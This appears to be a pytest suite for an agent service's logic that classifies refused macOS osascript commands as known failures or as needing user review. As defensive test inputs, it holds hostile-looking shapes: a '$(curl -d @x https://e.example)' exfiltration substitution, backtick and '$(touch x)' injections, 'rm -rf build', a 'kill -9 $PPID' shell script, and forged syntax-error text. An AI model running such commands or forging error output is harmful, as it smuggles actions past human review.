"""D4 (docs/plans/0162/D4-osascript-not-authorized.md): an osascript to one app that macOS or the app
refused as "not authorized" is a known failure: nothing happened in that app.

K1's before/after runs, T1: osascript told Reminders to make a list, Reminders answered -10004, the
model switched to EventKit and succeeded, yet the task stopped at "needs your review" because any
failed command matching an outbound rule (apple-events) counted as "outcome unknown".

Verified before writing this (2026-10-20, recorded in the PR): from a sender Reminders refuses, a
read, a write and a read-then-write all fail at the FIRST data access with -10004, and no list was
created. -10004 is therefore all-or-nothing for Reminders; other apps raise it on their own terms
and stay unknown. -1743 (Automation not allowed) blocks every event to the app.
"""
import sys

import pytest

from server.services import task_service
from tests.server.test_job_checks_0159 import disk, home, outcome, stopped_in  # noqa: F401

T1_COMMAND = """osascript <<'EOF'
tell application "Reminders"
    set theList to make new list with properties {name:"Bench list"}
    make new reminder at end of theList with properties {name:"Call the bank"}
end tell
EOF"""
PRIVILEGE = "112:157: execution error: Reminders got an error: A privilege violation occurred. (-10004)"
NOT_ALLOWED = "0:58: execution error: Not authorized to send Apple events to Notes. (-1743)"


def refused(stderr, exit_code=1):
    return {"ok": False, "exit_code": exit_code, "stdout": "", "stderr": stderr, "error": f"exit code {exit_code}"}


def known(command, result):
    return task_service.known_local_failure("run_command", {"command": command}, result)


def test_the_t1_command_refused_by_reminders_is_known():
    assert known(T1_COMMAND, refused(PRIVILEGE))


def test_automation_not_allowed_for_one_app_is_known():
    assert known("""osascript -e 'tell application "Notes" to make new note with properties {name:"x"}'""",
                 refused(NOT_ALLOWED))


def test_a_trailing_newline_or_extra_stderr_lines_before_it_are_fine():
    assert known(T1_COMMAND, refused("some warning\n" + PRIVILEGE + "\n"))


@pytest.mark.parametrize("command,stderr", [
    # -10004 is the app's own answer; only Reminders is verified all-or-nothing.
    ("""osascript -e 'tell application "Notes" to make new note'""",
     "0:40: execution error: Notes got an error: A privilege violation occurred. (-10004)"),
    # two apps, one of them nested
    ("""osascript <<'EOF'
tell application "Reminders"
    tell application "System Events" to keystroke "x"
end tell
EOF""", PRIVILEGE),
    # spellings that are not counted
    ("""osascript -e 'tell app "Reminders" to make new list'""", PRIVILEGE),
    ("""osascript -e 'tell application id "com.apple.reminders" to make new list'""", PRIVILEGE),
    ("osascript make_list.scpt", PRIVILEGE),
    ("""osascript -l JavaScript -e 'Application("Reminders").make()'""", PRIVILEGE),
    # scripts that run something else
    ("""osascript -e 'tell application "Reminders" to make new list' -e 'do shell script "rm x"'""", PRIVILEGE),
    ("""osascript -e 'run script "other.scpt"' -e 'tell application "Reminders" to make new list'""", PRIVILEGE),
    ("""osascript -e 'set s to load script "x.scpt"' -e 'tell application "Reminders" to count lists'""", PRIVILEGE),
    # more than one osascript, or more than osascript
    ("""osascript -e 'tell application "Reminders" to make new list' && echo ok""", PRIVILEGE),
    ("""osascript -e 'tell application "Reminders" to count lists'; osascript -e 'tell application "Reminders" to count lists'""",
     PRIVILEGE),
    # another error number, or the error names another app
    ("""osascript -e 'tell application "Reminders" to make new list'""",
     "0:40: execution error: Reminders got an error: Can't get list 1. (-1728)"),
    ("""osascript -e 'tell application "Reminders" to make new list'""", NOT_ALLOWED),
    # the here-doc ends at its FIRST delimiter line: what follows ran as shell, not AppleScript
    ("""osascript <<'EOF'
tell application "Reminders" to make new list
EOF
rm -rf build
EOF""", PRIVILEGE),
    # an unquoted here-doc expands $ and backticks: what ran is not what is written
    ("""osascript <<EOF
tell application "Reminders" to make new list with properties {name:"$NAME"}
EOF""", PRIVILEGE),
])
def test_everything_else_stays_unknown(command, stderr):
    assert not known(command, refused(stderr))


# ③Hands' review: AppleScript can act on this Mac without the words "do shell script", then reach the
# one app and be refused. Only tell-application lines and blocks are allowed; everything else is unknown.
ACTED_FIRST = [
    # the raw event behind do shell script (0.1.61 release gate B1)
    """osascript <<'EOF'
\u00abevent sysoexec\u00bb "touch /tmp/x"
tell application "Notes" to make new note
EOF""",
    # Standard Additions file writes
    """osascript <<'EOF'
set f to open for access POSIX file "/tmp/x" with write permission
write "data" to f
close access f
tell application "Notes" to make new note
EOF""",
    # AppleScriptObjC
    """osascript <<'EOF'
use framework "Foundation"
current application's NSFileManager's defaultManager()
tell application "Notes" to make new note
EOF""",
    # inside the tell, the raw event and a file write are still refused
    """osascript <<'EOF'
tell application "Notes"
    \u00abevent sysoexec\u00bb "touch /tmp/x"
    make new note
end tell
EOF""",
    """osascript <<'EOF'
tell application "Notes"
    set eof of (open for access POSIX file "/tmp/x" with write permission) to 0
end tell
EOF""",
    # any statement outside the tell that is not a side-effect-free `set` (D4 follow-up)
    """osascript <<'EOF'
set n to name of application "Finder"
tell application "Notes" to make new note
EOF""",
    """osascript <<'EOF'
tell application "Notes" to make new note
display dialog "done"
EOF""",
]


@pytest.mark.parametrize("command", ACTED_FIRST)
def test_a_script_that_can_act_before_the_tell_stays_unknown(command):
    assert not known(command, refused(NOT_ALLOWED))


def test_tell_blocks_comments_and_nested_object_tells_are_fine():
    command = """osascript <<'EOF'
-- add the note
tell application "Notes"
    tell folder "Notes"
        make new note with properties {name:"x"}
    end tell
end tell
EOF"""
    assert known(command, refused(NOT_ALLOWED))


def test_a_refusal_stopped_by_a_time_limit_or_a_signal_stays_unknown():
    command = """osascript -e 'tell application "Notes" to make new note'"""
    assert not known(command, {**stopped_in("unavailable"), "stderr": NOT_ALLOWED})
    assert not known(command, refused(NOT_ALLOWED, exit_code=-9))


async def test_the_t1_task_does_not_ask_for_review(execution_db, disk):  # noqa: F811
    task, _ = await outcome(("run_command", {"command": T1_COMMAND}, refused(PRIVILEGE)))
    assert task.pause_reason != "task_reconciliation_required"


async def test_another_apple_events_failure_still_asks_for_review(execution_db, disk):  # noqa: F811
    command = """osascript -e 'tell application "Reminders" to make new list'"""
    task, _ = await outcome(("run_command", {"command": command},
                             refused("0:40: execution error: Reminders got an error: Can't get list 1. (-1728)")))
    assert (task.phase, task.pause_reason) == ("waiting_user", "task_reconciliation_required")


# D4 follow-up (⓪Plan, the k2a-ds runs, T1 0/3): three shapes the first cut left "unknown".

def heredoc(script):
    return "osascript <<'EOF'\n" + script + "\nEOF"


TELL = 'tell application "Reminders"\n    make new reminder with properties {name:listName}\nend tell'


@pytest.mark.parametrize("prelude", [
    'set listName to "Today"',
    'set n to 3',
    'set flag to true',
    'set nothing to missing value',
    'set names to {"a", "b"}',
    'set d to current date',
    'set d to (current date) + 2 * days',
    'set d to date "Monday, 20 October 2026 at 09:00:00"',
    'set d to current date\nset dueDate to d + (1 * hours)\nset hours of dueDate to 9',
    '-- the list\nset listName to "Today" -- named',
    # k2a3-ds T1 r3's second attempt, top level as it ran (bench data only)
    """set listName to "对比测试-bench"
set now to (current date)

set tomorrow9 to now + 1 * days
set hours of tomorrow9 to 9
set minutes of tomorrow9 to 0
set seconds of tomorrow9 to 0

set w to ((weekday of now) as integer)
set fridayOffset to ((6 - w + 7) mod 7)
set fridayDate to now + (fridayOffset * days)

set nextMonOffset to ((2 - w + 7) mod 7)
if nextMonOffset = 0 then set nextMonOffset to 7
set nextMondayDate to now + (nextMonOffset * days)""",
])
def test_side_effect_free_sets_before_the_tell_are_allowed(prelude):
    assert known(heredoc(prelude + "\n" + TELL), refused(PRIVILEGE))


@pytest.mark.parametrize("prelude", [
    'set n to name of application "Finder"',     # reaches another app
    'set x to beep',                             # a command, not a variable
    'set x to foo()',                            # a handler call
    'set f to POSIX file "/tmp/x"',
    'set p to path to desktop',
    'set x to y',                                # not set before
    'copy "a" to x',
    'display dialog "go"',
    'set hours of y to 9',                       # y not set before
    'set x to "a" & "b"',                        # not in the grammar: stays unknown
    'set n to name of now',                      # `of` only for a date property
    'set d to current date\nset n to (weekday of d) as alias',
    'if x = 0 then set y to 1',                  # x not set before
    'if 1 = 1 then display dialog "x"',
    'on makeDate(y)\nreturn y\nend makeDate',   # a handler (k2a3-ds T1 r1)
])
def test_anything_else_before_the_tell_stays_unknown(prelude):
    assert not known(heredoc(prelude + "\n" + TELL), refused(PRIVILEGE))


SYNTAX = "0:43: syntax error: Expected end of line but found identifier. (-2741)"
# k2a3-ds T1 r3's first attempt, as it ran (bench data only): `friday` is a reserved word.
T1_R3_FIRST = heredoc("""set listName to "对比测试-bench"
set now to (current date)
set w to ((weekday of now) as integer)
set friday to now + (((6 - w + 7) mod 7) * days)
tell application "Reminders"
    set newList to make new list with properties {name:listName}
    tell newList
        make new reminder with properties {name:"交周报", allday due date:friday}
    end tell
end tell""")
T1_R3_SYNTAX = ("290:294: syntax error: Can\u2019t set Friday to now + (((6 - w + 7) mod 7) * days). "
                "Access not allowed. (-10003)")


@pytest.fixture
def compiles(monkeypatch):
    """Stands in for osacompile: whether the script compiles, and which scripts were checked."""
    state = {"compiles": False, "checked": []}

    def fails_to_compile(script):
        state["checked"].append(script)
        return not state["compiles"]
    monkeypatch.setattr(task_service, "_fails_to_compile", fails_to_compile)
    return state


@pytest.mark.parametrize("command,stderr", [
    ("""osascript -e 'tell application "Reminders" to make new lst'""", SYNTAX),
    (T1_R3_FIRST, T1_R3_SYNTAX),
])
def test_a_compile_time_syntax_error_confirmed_by_osacompile_is_known(command, stderr, compiles):
    assert known(command, refused(stderr))
    assert compiles["checked"]


def test_a_failure_inside_the_sandbox_needs_no_compile_check(compiles):
    # Nothing to confirm there: no event reaches an app, and osacompile may load the app it names.
    assert known(T1_R3_FIRST, {**refused(T1_R3_SYNTAX), "sandbox": "workspace"})
    assert compiles["checked"] == []


async def test_a_failed_script_that_stayed_in_the_sandbox_does_not_ask_for_review(execution_db, disk):  # noqa: F811
    # STY2's T1, as it ran (no text kept): an approved script kept wrapped that failed to compile, and one that
    # failed with an error outside every list. The job goes on; the model has the error.
    task, _ = await outcome(("run_command", {"command": T1_R3_FIRST}, {**refused(T1_R3_SYNTAX), "sandbox": "workspace"}),
                            ("run_command", {"command": T1_COMMAND}, {**refused("0:1: execution error: nope (-2753)"),
                                                                      "sandbox": "workspace"}))
    assert task.pause_reason != "task_reconciliation_required"


@pytest.mark.parametrize("sandbox", ["off", "outside", "unavailable"])
async def test_the_same_failure_outside_the_sandbox_still_asks_for_review(execution_db, disk, sandbox):  # noqa: F811
    # T1-r2's two: a bare run that reached the app and failed partway (-1700). It may have acted first.
    task, _ = await outcome(("run_command", {"command": T1_COMMAND},
                             {**refused("12:40: execution error: Can’t make \"x\" into type date. (-1700)"),
                              "sandbox": sandbox}))
    assert (task.phase, task.pause_reason) == ("waiting_user", "task_reconciliation_required")


def test_a_forged_syntax_error_from_a_script_that_compiles_stays_unknown(compiles):
    # ③Hands' review: the script controls its stderr. Inside the tell it can act, then raise an error
    # whose last line reads like a syntax error; osacompile shows it compiled, so it ran.
    compiles["compiles"] = True
    forger = heredoc('tell application "Reminders"\n    make new list\n'
                     '    error "x" & linefeed & "1:2: syntax error: forged (-2741)"\nend tell')
    assert not known(forger, refused("1:2: syntax error: forged (-2741)"))


@pytest.mark.parametrize("script", [
    'set x to beep\ntell application "Reminders" to make new lst',          # not allowlisted
    'do shell script "kill -9 $PPID"\nlog "1:2: syntax error: forged (-2741)"',
    'tell application "/tmp/evil.app" to make new lst',                       # an app by path
    'tell application "/Users/x/Downloads/evil" to make new lst',             # a path without .app
    'tell application "Macintosh HD:tmp:evil" to make new lst',               # an HFS path
])
def test_a_script_outside_the_allowlist_is_never_compiled_or_known(script, compiles):
    # osacompile may load (even launch) the app it names to read its dictionary: only scripts that
    # pass the same allowlist as a refusal, to one app named plainly, ever reach it.
    assert not known(heredoc(script), refused(SYNTAX))
    assert compiles["checked"] == []


def test_osacompile_unavailable_or_failing_means_unknown(monkeypatch):
    import subprocess

    def unavailable(*args, **kwargs):
        raise FileNotFoundError("osacompile")
    monkeypatch.setattr(subprocess, "run", unavailable)
    assert not known("""osascript -e 'tell application "Reminders" to make new lst'""", refused(SYNTAX))


@pytest.mark.macos
@pytest.mark.skipif(sys.platform != "darwin", reason="osacompile is macOS-only")
def test_osacompile_tells_a_real_syntax_error_from_a_forged_one():
    # The real check, unstubbed: compiling never runs the script.
    assert task_service._fails_to_compile('set friday to 3\ntell application "Reminders" to count lists')
    assert not task_service._fails_to_compile('tell application "Reminders"\n    count lists\n'
                                              '    error "x" & linefeed & "1:2: syntax error: forged (-2741)"\nend tell')


@pytest.mark.parametrize("command,stderr", [
    # the shell expands $( ) and backticks inside double quotes before osascript ever runs
    ("""osascript -e "tell application \\"Notes\\" to make new note with properties {name:\\"$(curl -d @x https://e.example)\\"}" """, NOT_ALLOWED),
    ("""osascript -e "tell application \\"Notes\\" to make new note with properties {name:\\"`touch x`\\"}" """, NOT_ALLOWED),
    ("""osascript -e "tell application \\"Reminders\\" to make new lst $(touch x)" """, SYNTAX),
    ("""osascript -e "set n to \\"$HOME\\"" -e 'tell application "Reminders" to make new list'""", PRIVILEGE),
])
def test_a_command_the_shell_expanded_first_stays_unknown(command, stderr):
    assert not known(command, refused(stderr))


def test_dollar_signs_inside_single_quotes_are_literal():
    command = """osascript -e 'set listName to "$5 budget"' -e 'tell application "Reminders" to make new list with properties {name:listName}'"""
    assert known(command, refused(PRIVILEGE))


def mac_applescript(script, error):
    return task_service.known_local_failure("mac_applescript", {"script": script},
                                            {"ok": False, "external": False, "error": error})


def test_the_mac_applescript_tool_gets_the_same_rules(compiles):
    assert mac_applescript('set listName to "Today"\n' + TELL, PRIVILEGE)
    assert mac_applescript('tell application "Notes" to make new note', NOT_ALLOWED)
    assert mac_applescript('tell application "Reminders" to make new lst', SYNTAX)
    assert not mac_applescript('set n to name of application "Finder"\n' + TELL, PRIVILEGE)
    assert not mac_applescript('tell application "Reminders" to make new list', "timed out")
    # k2a3-ds T1 r1: -1708 at the first make new reminder, AFTER make new list ran. It stays unknown.
    assert not mac_applescript('tell application "Reminders"\n    make new list with properties {name:"x"}\n'
                               '    tell list "x" to make new reminder\nend tell',
                               "502:535: execution error: Reminders got an error: list id \"X\" doesn\u2019t "
                               "understand the \u201cmakeDate\u201d message. (-1708)\n")
    assert not mac_applescript('tell application "Notes" to make new note',
                               "0:40: execution error: Notes got an error: A privilege violation occurred. (-10004)")


def test_a_script_raising_its_own_syntax_error_text_after_acting_stays_unknown(compiles):
    # osascript prints a script's own `error "syntax error: …"` as an EXECUTION error: it ran.
    command = heredoc('do shell script "touch x"\nerror "syntax error: fake (-1)"')
    assert not known(command, refused("0:50: execution error: syntax error: fake (-1) (-2700)"))


def test_an_escaped_quote_cannot_hide_a_substitution():
    command = """osascript -e "tell application \\"Notes\\" to make new note with properties {name:\\" ' $(touch x) ' \\"}" """
    assert not known(command, refused(NOT_ALLOWED))


def test_a_date_property_reads_before_its_unit_meaning():
    assert known(heredoc('set now to current date\nset h to hours of now\n' + TELL), refused(PRIVILEGE))


# -- the tell-depth counter follows AppleScript's own block structure (#979 max review, pre-existing holes) -------------
# Each shape below shifted the depth so that a later top-level line was never checked. Benign payloads only.
ACTS = 'display dialog "x"'
TAIL = '\ntell application "Reminders" to make new list'
DESYNC = {
    "bare end": 'tell application "Reminders"\nend\n' + ACTS + '\ntell "x to y"\nend tell' + TAIL,
    "end continued": 'tell application "Reminders"\nend ¬\ntell\n' + ACTS + '\ntell "a to b"\nend tell\n'
                     'tell "c to d"\nend tell' + TAIL,
    "multi-line string": 'tell application "Reminders"\nset s to "\ntell x\n"\nend tell\n' + ACTS +
                         '\ntell "a to b"\nend tell' + TAIL,
    "dashes in a string": 'tell application "Reminders"\ntell list "a--" to count reminders\nend tell\n' + ACTS +
                          '\ntell "x to y"\nend tell' + TAIL,
    "hash in a string": 'tell application "Reminders"\ntell list "a#" to count reminders\nend tell\n' + ACTS + TAIL,
    "vertical tab": 'tell application "Reminders"\x0bmake new list\nend tell\n' + ACTS + TAIL,
    "line separator": 'tell application "Reminders" make new list\nend tell' + TAIL,
    "no-break space": 'tell application "Reminders"\nmake new list\nend tell\n' + ACTS + TAIL,
}


@pytest.mark.parametrize("name", sorted(DESYNC))
def test_a_shape_that_desyncs_the_tell_depth_stays_unknown(name, compiles):
    script = DESYNC[name]
    assert not task_service._only_tells(script)
    assert not mac_applescript(script, PRIVILEGE)
    assert not known(heredoc(script), refused(PRIVILEGE))


@pytest.mark.parametrize("script", [
    'tell application "Reminders"\n    make new list with properties {name:"a--b #c"}\nend tell',
    'tell application "Reminders" -- the list\n    make new list\nend tell # done',
    'tell application "Reminders" to make new list with properties {name:"to the end"}',
])
def test_dashes_and_hashes_inside_strings_and_comments_after_code_are_fine(script):
    assert task_service._only_tells(script)
    assert mac_applescript(script, PRIVILEGE)


# -- `-e` scripts: what D4 reads must be what bash passes (#979 max review) ---------------------------------------------

@pytest.mark.parametrize("command", [
    # a backslash-newline: bash joins the lines, shlex keeps them apart
    "osascript -e 'tell application \"Reminders\"' -e 'count lists' "
    "-e \"error \\\"x\\\" & linefeed & \\\"1:2: syntax error: forged (-2741)\\\" \\\n\" -e 'end tell'",
    "osascript -e 'tell application \"Reminders\"'\\\n' to make new list'",
    # a newline outside quotes ends the command: what follows runs as shell
    "osascript -e 'tell application \"Reminders\" to make new list'\necho done",
])
def test_an_e_command_bash_would_read_differently_is_never_judged(command, compiles):
    assert task_service._inline_osascript(command) is None
    assert not known(command, refused(PRIVILEGE)) and not known(command, refused(SYNTAX))


def test_a_newline_inside_quotes_is_still_one_e_script():
    command = "osascript -e 'tell application \"Reminders\"\n    make new list\nend tell'"
    assert task_service._inline_osascript(command) == 'tell application "Reminders"\n    make new list\nend tell'
    assert known(command, refused(PRIVILEGE))



# One guard each: with that guard gone, the shape below would be judged known.
@pytest.mark.parametrize("script", [
    'tell application "Reminders"\nend\n' + ACTS + '\nend tell',                              # a bare end
    'tell application "Reminders" to make new list\u2028' + ACTS,                              # breaks Python doesn't
    'tell application "Reminders" to make new list\x0b' + ACTS,
    'tell application "Reminders" to make new list\r' + ACTS,                                  # a lone CR
    'tell application "Reminders"\n    make new list with properties {name:"a\nb"}\nend tell',  # a string across lines
])
def test_each_structure_guard_refuses_on_its_own(script):
    assert not task_service._only_tells(script)


@pytest.mark.parametrize("script", [
    'tell application "Reminders"\n    tell list "a--" to count reminders\nend tell',     # `--` in a name: no comment
    'tell application "Reminders"\n    tell list "x to y"\n        count reminders\n    end tell\nend tell',
    'tell application "Reminders"\r\n    make new list\r\nend tell',                       # CRLF lines
])
def test_strings_and_crlf_keep_the_count_right(script):
    assert task_service._only_tells(script)


# -- #983 max review, round 1: allowlists, not more shapes refused one by one ----------------------------------------
BOM = "\ufeff"
R = 'tell application "Reminders"'
BLOCK_TAIL = '\ntell (a reference to me)\nend tell' + TAIL
ROUND_983 = {
    "a quote then to": R + '\ntell "abc"to get length\nend tell\n' + ACTS + BLOCK_TAIL,
    "to then a parenthesis": R + '\ntell "abc" to(get length)\nend tell\n' + ACTS + BLOCK_TAIL,
    "a bar identifier holding #": R + '\nset |#| to "abc"\ntell |#| to get length\nend tell\n' + ACTS + BLOCK_TAIL,
    "a bar identifier holding --": R + '\nset |--| to "abc"\ntell |--| to get length\nend tell\n' + ACTS + BLOCK_TAIL,
    "U+FEFF before end tell": R + '\n' + BOM + 'end tell\n' + ACTS + BLOCK_TAIL,
    "U+FEFF before a bare end": R + '\n' + BOM + 'end\n' + ACTS + '\n' + BOM + 'tell "abc"\nend tell' + TAIL,
    "U+FEFF inside end tell": R + '\nend' + BOM + 'tell\n' + ACTS + BLOCK_TAIL,
}


@pytest.mark.parametrize("name", sorted(ROUND_983))
def test_round_983_shapes_stay_unknown(name, compiles):
    script = ROUND_983[name]
    assert not task_service._only_tells(script)
    assert not mac_applescript(script, PRIVILEGE) and not mac_applescript(script, NOT_ALLOWED)
    assert not known(heredoc(script), refused(PRIVILEGE))


@pytest.mark.parametrize("script,ok", [
    (R + '\n    tell "abc"to get length\nend tell', True),                  # one line: to right after the string
    (R + '\n    tell x to(get length)\nend tell', True),                     # one line: to before a parenthesis
    (R + '\n    tell (a reference to me)\n        count lists\n    end tell\nend tell', True),   # a block
    (R + '\n    make new list with properties {name:"对比测试 ✓"}\nend tell', True),   # any language inside a string
    (R + '\n    make new list with properties {name:"a\u00a0b"}\nend tell', False),   # but no odd space
    (R + '\n    make new list with properties {name:"a\u200bb"}\nend tell', False),   # or format character
    (R + '\n    make new list with properties {name:"a|b"}\nend tell', False),       # `|` refused anywhere
    (R + '\n    make new list \u00ac\n        with properties {name:"x"}\nend tell', False),
])
def test_the_character_and_to_rules(script, ok):
    assert task_service._only_tells(script) is ok


@pytest.mark.parametrize("command", [
    # bash keeps a mid-word `#`; shlex took it as a comment
    "osascript -e 'tell application \"Reminders\"' -e 'end tell'#x -e 'display dialog \"x\"' "
    "-e 'tell application \"Reminders\" to make new list'",
    # brace expansion makes more words in bash
    "osascript -e 'tell application \"Reminders\"' -e {'end tell',-e,'display dialog \"x\"',-e,"
    "'tell application \"Reminders\"'} -e 'end tell' -e 'tell application \"Reminders\" to make new list'",
    # an escape inside double quotes
    "osascript -e 'tell application \"Reminders\"' -e \"count lists \\$\" -e 'end tell'",
    "osascript -e $'tell application \"Reminders\"\\nend\\ndisplay dialog \"x\"'",       # ANSI-C quoting
    "osascript -e \"$(printf x)\" -e 'tell application \"Reminders\" to make new list'",
    "osascript -e 'tell application \"Reminders\"'\\\n' to make new list'",               # backslash-newline
    "osascript -e 'tell application \"Reminders\" to make new list'\necho done",           # a newline ends it
    "osascript -e \"tell application \\\"Reminders\\\" to make new list\"",           # double quotes at all
    "osascript -e'tell application \"Reminders\" to make new list'",                     # no space after -e
])
def test_only_single_quoted_e_words_are_judged(command, compiles):
    assert task_service._inline_osascript(command) is None
    assert not known(command, refused(PRIVILEGE)) and not known(command, refused(SYNTAX))


def test_single_quoted_e_words_are_read_as_bash_reads_them():
    command = ("/usr/bin/osascript -e 'tell application \"Reminders\"'  -e '    make new list with properties "
               "{name:\"a#b -- c\"}'\t-e 'end tell'")
    assert task_service._inline_osascript(command) == ('tell application "Reminders"\n    make new list with '
                                                        'properties {name:"a#b -- c"}\nend tell')
    assert known(command, refused(PRIVILEGE))


def test_a_mid_word_hash_hides_nothing_from_the_bare_run_gate():
    # U11: bash passes `-e 'do shell script …'` as a word; the gate must see it or refuse the command
    hidden = "osascript -e 'tell application \"Reminders\" to count lists'#x -e 'do shell script \"true\"'"
    assert task_service._inline_osascript(hidden) is None and not task_service.unwrapped_once(hidden)
    assert task_service.unwrapped_once("osascript -e 'tell application \"Reminders\" to count lists'")
    # and the shortcuts form reads every word bash does: an output path after a mid-word `#` is still checked
    assert not task_service.unwrapped_once("shortcuts run 'My Shortcut'#x -o /etc/elsewhere")
